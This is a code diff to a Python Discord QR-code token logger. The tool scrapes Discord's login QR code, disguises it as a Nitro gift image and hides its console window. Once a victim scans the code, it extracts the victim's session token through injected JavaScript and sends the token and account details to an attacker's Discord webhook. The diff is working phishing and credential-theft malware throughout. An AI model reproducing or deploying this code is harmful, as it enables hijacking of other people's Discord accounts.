@@ -6,24 +6,23 @@ from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from discord_webhook import DiscordEmbed, DiscordWebhook
 from pystyle import System, Center, Colorate, Colors, Box, Write
-from utilities import pystray_img, banner
+from resources.utilities import pystray_img, banner
 from pystray import Menu, MenuItem, Icon
 from io import BytesIO
 import ctypes
 from threading import Thread
-from shutil import get_terminal_size
 import time
+from tempfile import TemporaryDirectory, NamedTemporaryFile
 
-def generate_qr() -> None:
-    qr_img = Image.open(os.path.normpath(r"resources/qr_code.png"), "r")
-    ovly_img = Image.open(os.path.normpath(r"resources/overlay.png"), "r")
+def generate_qr(path_1, path_2) -> None:
+    qr_img = Image.open(path_1, "r")
+    ovly_img = Image.open(os.path.join(os.getcwd(), 'resources', 'overlay.png'), "r")
     qr_img.paste(ovly_img, (60, 55))
-    qr_img.save(os.path.normpath(r"resources/final_qr.png"), quality=95)
+    qr_img.save(path_2, quality=95)
 
-def generate_nitro_template() -> None:
-    nitro_template = Image.open(os.path.normpath(r"resources/template.png"), "r")
-    qr_img = Image.open(os.path.normpath(r"resources/final_qr.png"), "r")
-    nitro_template.paste(qr_img, (120, 409))
+def generate_nitro_template(path_2) -> None:
+    nitro_template = Image.open(os.path.join(os.getcwd(), 'resources', 'template.png'), "r")
+    nitro_template.paste(Image.open(path_2, "r"), (120, 409))
     nitro_template.save("discord_gift.png", quality=95)
 
 def get_user_data(tk):
@@ -44,13 +43,14 @@ def get_discord_info(tk, link_int):
     
 def main(webhook_url) -> None:
     Write.Print("\n\n[!] Generating Qr-Code...", Colors.red_to_purple)
-    webdriver.ChromeOptions.binary_location = r"browser/chrome.exe"
     opts = webdriver.ChromeOptions()
     opts.add_experimental_option("detach", True)
     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
     opts.headless = True
-    opts.add_argument('--log-level 3') 
-    driver = webdriver.Chrome(service=Service(os.path.normpath(r"browser/chromedriver.exe")), options=opts)
+    opts.add_argument('--log-level 3')
+    from webdriver_manager.chrome import ChromeDriverManager # Importing the module here because it has conflict with pystyle.
+    os.environ['WDM_LOG_LEVEL'] = '0'
+    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
     driver.get("https://discord.com/login")
     time.sleep(5)
     source = BeautifulSoup(driver.page_source, features="lxml")
@@ -62,21 +62,25 @@ def main(webhook_url) -> None:
     qr_code = div.find("img")["src"]
     source = BeautifulSoup(driver.page_source, features="lxml")
     div = source.find("div", {"class": "qrCode"})
-    file = os.path.join(os.getcwd(), r"resources/qr_code.png")
-    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
-    with open(file, "wb") as handler:
-        handler.write(img_data)
-    Write.Print("\n[!] Generating QR-Code template...", Colors.red_to_purple)
     discord_login = driver.current_url
-    generate_qr()
-    Write.Print("\n[!] Generating QR-Code Nitro template...", Colors.red_to_purple)
-    generate_nitro_template()
+    with TemporaryDirectory(dir='.') as td:
+        with NamedTemporaryFile(dir=td, suffix='.png') as tp1:
+            tp1.write(base64.b64decode(qr_code.replace('data:image/png;base64,', '')))
+            Write.Print("\n[!] Generating QR-Code template...", Colors.red_to_purple)
+            with NamedTemporaryFile(dir=td, suffix='.png') as tp2:
+                generate_qr(tp1, tp2)
+                Write.Print("\n[!] Generating QR-Code Nitro template...", Colors.red_to_purple)
+                generate_nitro_template(tp2)
     Write.Print("\n[#] Waiting for target...", Colors.red_to_purple)
     pystray_icon.icon.notify("Script currently being hided until target grabbed.", 'Waiting for target')
     time.sleep(3)
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     while True:
         if discord_login != driver.current_url:
+            try:
+                os.remove('discord_gift.png')
+            except:
+                pass
             token = driver.execute_script('''
                 window.dispatchEvent(new Event('beforeunload'));
                 let iframe = document.createElement('iframe');
@@ -87,12 +91,12 @@ def main(webhook_url) -> None:
                 return token;
                 ''')
             break
+    driver.quit()
     pystray_icon.icon.notify("The traget scanned the QR-code sucessfuly.", 'New Victim !')
     time.sleep(3)
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
     Write.Print(f"\n\n[?] Token grabbed: {token}", Colors.rainbow)
     Write.Print("\n\n[!]Fetching token data...", Colors.red_to_purple)
-    driver.quit()
     webhook = DiscordWebhook(url=webhook_url, username='QR-Dtg', avatar_url="https://i.postimg.cc/qRHbRP2g/discord-avatar.png")
     embed = DiscordEmbed(color='88c800')
     if re.search(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) != None:
@@ -116,15 +120,13 @@ def main(webhook_url) -> None:
         embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)
     webhook.add_embed(embed)
     embed.set_footer(text='By Luci (9P9), Lemon.-_-.#3714, the-cult-of-integral and mte0', inline=False)
-    Write.Print("\n[!]Sending data to discord webhook...", Colors.red_to_purple)
+    Write.Print("\n[!] Sending data to discord webhook...", Colors.red_to_purple)
     webhook.execute()
-    Write.Input('\n\nPress any button to quit.', Colors.blue_to_green)
+    Write.Input('\n\n[*] Press ENTER to quit.', Colors.blue_to_green)
     
 if __name__ == "__main__":
     System.Title('QR DISCORD LOGIN - By Luci (9P9), Lemon.-_-.#3714, the-cult-of-integral and mte0')
     System.Size(140, 35)
-    def print_center(s):
-        return s.center(get_terminal_size().columns)
     print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(banner), 1))
     print(Colorate.Horizontal(Colors.rainbow, Center.GroupAlign(Box.DoubleCube("By Luci (9P9), Lemon.-_-.#3714, the-cult-of-integral and mte0")), 1))
     print(Colorate.Horizontal(Colors.rainbow, Box.Lines("https://github.com/9P9/Discord-QR-Token-Logger").replace('ቐ', "$"), 1), "\n")
